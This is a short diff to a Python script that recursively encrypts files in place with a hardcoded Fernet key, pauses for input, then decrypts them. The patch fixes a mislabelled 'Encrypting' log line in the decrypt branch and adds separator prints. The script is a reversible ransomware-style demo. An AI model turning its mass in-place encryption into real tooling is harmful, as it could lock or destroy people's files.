@@ -43,7 +43,7 @@ def iter(road, mode):
                     else:
                         contains = False
                 if not contains:
-                    print(f'Encrypting: {f}')
+                    print(f'Decrypting: {f}')
                     f2 = open(f, 'rb')
                     encrypt = bob_marley.decrypt(f2.read())
                     f2.close()
@@ -56,5 +56,7 @@ fornication = b'5VsQ04U13bSDhhbv8Uk9nFbPfPY1VGoVhkA87JDyYdA='
 bob_marley = Fernet(fornication)
 
 iter(road, 'encrypt')
+print('-------------------------------------------')
 input('Enter anything to proceed to decryption: ')
+print('-------------------------------------------')
 iter(road, 'decrypt')
